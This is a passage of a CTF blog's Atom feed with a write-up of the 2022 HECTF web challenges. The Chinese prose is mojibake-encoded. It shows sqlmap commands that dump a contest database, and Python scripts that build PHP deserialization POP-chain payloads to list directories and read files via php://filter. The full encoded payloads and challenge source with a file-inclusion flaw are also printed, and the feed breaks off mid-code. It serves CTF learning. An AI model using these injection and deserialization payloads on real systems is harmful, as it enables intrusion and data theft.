<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2022-11-08T17:43:20.339Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022 HECTF</title>
    <link href="https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/"/>
    <id>https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/</id>
    <published>2022-11-07T13:38:28.000Z</published>
    <updated>2022-11-08T17:43:20.339Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>2022HECTFæ˜¯ç”±æ²³åŒ—å¸ˆèŒƒå¤§å­¦SourceCodeæˆ˜é˜Ÿç»„ç»‡çš„é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„CTFç«æŠ€æ´»åŠ¨ï¼Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦è®¡ç®—æœºä¸ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ä¸»åŠï¼Œæ²³åŒ—çœç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤å’Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦ä¿¡æ¯å®‰å…¨åä¼šæ‰¿åŠï¼Œæ˜¯é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„ä¸€æ¬¡ç«æŠ€æ´»åŠ¨ã€‚</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="è¿·è·¯çš„å°ç‹®"><a href="#è¿·è·¯çš„å°ç‹®" class="headerlink" title="è¿·è·¯çš„å°ç‹®"></a>è¿·è·¯çš„å°ç‹®</h3><blockquote><p>ç­¾åˆ°é¢˜</p><p>HINTS:</p><p>å®˜ç½‘åœ°å€éœ€å¡«å†™å®Œæ•´(å»ºè®®å¤åˆ¶)ï¼Œæ— è·¯å¾„å³ç»“å°¾ä¸º.cn</p></blockquote><p>è¿›å…¥æ˜¯è¿·æƒ‘æ€§çš„404é¡µé¢ï¼Œä¸”å³é”®å’ŒF12ç¦ç”¨ï¼Œåœ°å€æ æ‰‹åŠ¨æ·»åŠ  <code>view-source:</code> çœ‹åˆ°æºç æç¤º <code>hectfer</code>ã€‚</p><p>è®¿é—® <code>/hectfer</code> æç¤º <code>hebnu is a good site.</code>ï¼Œè®¿é—® <code>/hebnu</code> æç¤º <code>Can you use another way of requesting?</code></p><p>ä¸Šburpsuiteï¼ŒæŒ‰æç¤ºæŒ‰æ­¥éª¤ä¿®æ”¹request headerçš„å‡ å¤„ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hebnu HTTP/1.1</span><br><span class="line">User-Agent: Internet Explorer</span><br><span class="line">Referer: https://www.hebtu.edu.cn</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>åœ¨responce headeré‡Œçœ‹åˆ°PHPFuckä»£ç ï¼Œæ§åˆ¶å°è¿è¡Œç›´æ¥å¾—åˆ°flagï¼š<code>HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æ“å¤©æ³¨"><a href="#æ“å¤©æ³¨" class="headerlink" title="æ“å¤©æ³¨"></a>æ“å¤©æ³¨</h3><p>æ‰¾åˆ°GETå‚æ•°idï¼Œç”¨sqlmapå¯ä»¥ç›´æ¥é€šè¿‡æ—¶é—´ç›²æ³¨è·‘å‡ºflagã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># çˆ†æ•°æ®åº“å</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“åctfï¼Œçˆ†è¡¨å</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“åctfï¼Œè¡¨å3eDf4f07efC9ee16ï¼Œçˆ†åˆ—åå’Œå†…å®¹</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf -T 3eDf4f07efC9ee16 --columns --dump</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><blockquote><p>ä¸€é“ç¥å¥‡çš„ååºåˆ—åŒ–é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Welcome to HECTF Have fun!!!ğŸ˜Š&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file-&gt;var))&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line"> <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;éš¾é“æˆ‘çœŸçš„è¦å¤±è´¥äº†ï¼Œå—&quot;</span>.<span class="keyword">$this</span>-&gt;str;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;huang-&gt;str;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$eee</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$aaa</span>=<span class="string">&quot;who are you?&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ccc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;eee-&gt;flag();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$css</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;ccc;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ddd</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ext</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;ddd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;ddd(<span class="keyword">$this</span>-&gt;ext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$gagaga</span> = <span class="keyword">new</span> A();</span><br><span class="line">unserialize(serialize(<span class="variable">$gagaga</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>); </span><br></pre></td></tr></table></figure></blockquote><p>æ„é€ ååºåˆ—åŒ–é“¾ï¼š</p><p><code>A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new()</code></p><p>åˆ©ç”¨å†…ç½®ç±» <code>DirectoryIterator</code> + <code>glob://</code>ä¼ªåè®®åˆ—ç›®å½•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;DirectoryIterator&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;glob:///*f*&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload:</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># æ–‡ä»¶å /ffflllllaaaaaaggggg.txt</span></span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨å†…ç½®ç±» <code>SplFileObject</code> + <code>php://filter</code>ä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ï¼š </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;SplFileObject&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># HECTF&#123;u_find_m</span></span><br><span class="line"><span class="comment"># y_trulyself&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h3><p>è§‚å¯Ÿé¡µé¢ï¼Œæœ‰å›¾ç‰‡ä¸Šä¼ ç‚¹ï¼Œurlå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»æºç ï¼š</p><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">define(&#x27;FROM_INDEX&#x27;, 1);</span><br><span class="line">include(&#x27;class.php&#x27;);</span><br><span class="line"></span><br><span class="line">$file=$_POST[&#x27;file&#x27;];</span><br><span class="line">$show = empty($_GET[&#x27;show&#x27;]) ? &#x27;home&#x27; : $_GET[&#x27;show&#x27;];</span><br><span class="line">if(!is_string($show) || preg_match(&#x27;/\.\./&#x27;, $show) || preg_match(&#x27;/zip/i&#x27;,$show))</span><br><span class="line">    die(&#x27;Not this !!!&#x27;);</span><br><span class="line"></span><br><span class="line">ob_start(&#x27;ob_gzhandler&#x27;);</span><br><span class="line"></span><br><span class="line">function page_tshow($show) &#123;</span><br><span class="line">?&gt;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;header&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=&quot;?show=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;body&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fatal($msg) &#123;</span><br><span class="line">?&gt;&lt;div class=&quot;article&quot;&gt;</span><br><span class="line">&lt;h2&gt;Error&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;&lt;?php</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_tshow($show);</span><br><span class="line"></span><br><span class="line">if(!(include $show . &#x27;.php&#x27;))</span><br><span class="line">    fatal(&#x27;no no no&#x27;);</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    if(file_exists($file))</span><br><span class="line">        echo $file.&quot;surely exists&quot;;</span><br><span class="line">    else   </span><br><span class="line">        echo $file.&quot;dont exist&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;common.php&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class=&quot;article&quot;&gt;</span><br><span class="line">    &lt;h2&gt;Welcome to HECTF ï¼ï¼ï¼&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        Click here to upload your file =&gt; &lt;a href=&quot;?show=upload&quot;&gt;ä¼ é€é—¨&lt;/a&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;common.php&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; isset($_FILES[&#x27;image&#x27;])) &#123;</span><br><span class="line">    $fn = $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $ft = $_FILES[&#x27;image&#x27;][&#x27;type&#x27;];</span><br><span class="line"></span><br><span class="line">    if(!is_uploaded_file($fn)) &#123;</span><br><span class="line">        fatal(&#x27;uploaded file corrupted&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = array(&#x27;image/png&#x27;);</span><br><span class="line">    if(!in_array($ft,$array))&#123;</span><br><span class="line">        fatal(&quot;No, I want png picture áµ•á·„Î¹ Ì áµ•á·…&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $imagekey = create_image_key();</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($fn, &quot;uploads/$imagekey.png&quot;);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: ?show=show&amp;imagekey=$imagekey&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class=&quot;article&quot;&gt;</span><br><span class="line">    &lt;h2&gt;Plz Give me a file I want.&lt;/h2&gt;</span><br><span class="line">    &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?show=upload&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;image&quot;&gt;áµ•á·„Î¹ Ì áµ•á·…    </span><br><span class="line"> &lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">&#x27;FROM_INDEX&#x27;</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;MAX_IM_SIZE&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span 